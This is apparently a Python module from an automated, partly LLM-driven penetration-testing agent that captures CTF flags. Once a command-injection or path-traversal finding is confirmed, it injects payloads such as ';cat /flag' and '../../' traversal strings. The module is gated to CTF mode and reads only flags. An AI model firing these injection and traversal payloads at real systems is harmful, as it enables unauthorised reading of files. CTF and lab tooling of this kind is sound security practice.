"""CTF flag 捕获 —— 仅用于 CTF/授权靶场（win_condition=flag）的评估。

把一个已确认的命令注入/LFI 发现，升级为读取**出题者放置的 flag**（CTF 的既定良性目标）。
严格门控：仅当 HERMES_CTF_MODE=1 时启用；只做读取 flag，不投递破坏性命令、不外泄真实用户数据。
"""
from __future__ import annotations

import os
import re

from hermes import tools
from hermes_ctf_lab import meta

FLAG_RE = re.compile(os.environ.get("HERMES_FLAG_REGEX",
                     r"(?:flag|FLAG|HTB|CTF|xben)\{[^}\s]{1,200}\}"))
FLAG_PATHS = ["/flag", "/flag.txt", "flag.txt", "/app/flag.txt", "/app/flag",
              "/root/flag.txt", "/flag/flag.txt", "/tmp/flag", "/var/www/html/flag.txt"]


def enabled() -> bool:
    return os.environ.get("HERMES_CTF_MODE", "").lower() in ("1", "true", "yes")


def _payloads(kind: str, path: str) -> list[str]:
    if kind == "cmdi":
        return [f";cat {path}", f"$(cat {path})", f"|cat {path}", f"&& cat {path}", f"`cat {path}`"]
    if kind == "lfi":
        return [path, "../../../../../../" + path.lstrip("/")]
    return []


def capture_flag(finding: dict, session=None) -> str | None:
    """对已确认的 cmdi/lfi 发现尝试读取 flag。返回 flag 串或 None。"""
    if not enabled():
        return None
    ex = finding.get("_exploit")
    if not ex:
        return None
    ep, param, kind = ex["ep"], ex["param"], ex["kind"]
    for path in FLAG_PATHS:
        for pl in _payloads(kind, path):
            try:
                r, _ = tools.inject(ep, param, pl, session=session)
            except Exception:  # noqa: BLE001
                continue
            m = FLAG_RE.search(r.text)
            if m:
                return m.group(0)
    return None


def try_capture(findings: list[dict], session=None) -> dict:
    """遍历已确认发现，简单读取 flag（直接法）。"""
    for f in findings:
        if f.get("class") in ("Command Injection", "Path Traversal"):
            flag = capture_flag(f, session=session)
            if flag:
                return {"captured": True, "flag": flag, "via": f["id"], "method": "direct"}
    return {"captured": False}


def agent_hunt(entrypoints: list[dict], session=None, source_text="", max_eps: int = 10) -> dict:
    """按题推理 agent 入口 —— 统一 Meta 推理循环（G6）。

    构建共享工作记忆（一次侦察 + 题型指纹 + 跨策略中间产物）→ `MetaSolver` 按指纹自适应定序
    地调度 skill/原语/planner/synth（打平/卡住时一次 LLM 裁决）→ 命中即止。默认优先级=原级联顺序，
    覆盖不减、行为≥旧级联；`max_eps` 保留以兼容签名。有界，仅 CTF/授权靶场（`enabled()` 门控）。
    """
    if not enabled():
        return {"captured": False}
    wm = meta.WorkingMemory(entrypoints or [], session=session, source_text=source_text)
    return meta.MetaSolver(wm).solve()
